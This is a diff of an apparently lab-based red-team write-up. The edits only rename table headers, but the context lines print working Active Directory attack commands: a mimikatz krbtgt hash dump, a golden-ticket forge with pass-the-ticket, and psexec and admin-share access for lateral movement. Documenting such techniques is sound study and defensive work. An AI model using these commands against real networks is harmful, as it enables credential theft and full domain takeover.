@@ -186,9 +186,9 @@ The Administrator NTLM hash was recovered from memory. This hash can be used for
 ```bash
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Flag           | Description                                               |
+| Part           | Description                                               |
 |----------------|-----------------------------------------------------------|
 | `lsadump::lsa` | Dumps credentials from the LSA (Local Security Authority) |
 | `/inject`      | Injects into the LSASS process to extract data            |
@@ -208,9 +208,9 @@ This command also provides the Domain SID, which is needed when generating the t
 kerberos::golden /user:Administrator /domain:readteambd.local /sid:S-1-5-21-2745015721-426968701-4006811760 /krbtgt:5f8156b8f557baae7cd069ac724e1959 /id:500 /ptt
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-| Flag | Value | Description |
+| Part | Value | Description |
 |------|-------|-------------|
 | `/user` | `Administrator` | The user I am impersonating |
 | `/domain` | `readteambd.local` | The domain name |
@@ -261,9 +261,9 @@ Any command executed inside this CMD shell will use the injected Kerberos ticket
 dir \\192.168.5.142\c$
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-| Flag | Description |
+| Part | Description |
 |------|-------------|
 | `dir` | Lists files and folders |
 | `\\192.168.5.142` | IP address of the target victim machine |
@@ -301,9 +301,9 @@ I was able to access another machine in the domain with Domain Administrator pri
 psexec \\192.168.5.142 cmd.exe
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-| Flag | Description |
+| Part | Description |
 |------|-------------|
 | `psexec` | Sysinternals tool that runs commands remotely on other machines |
 | `\\192.168.5.142` | IP address of the target victim machine |
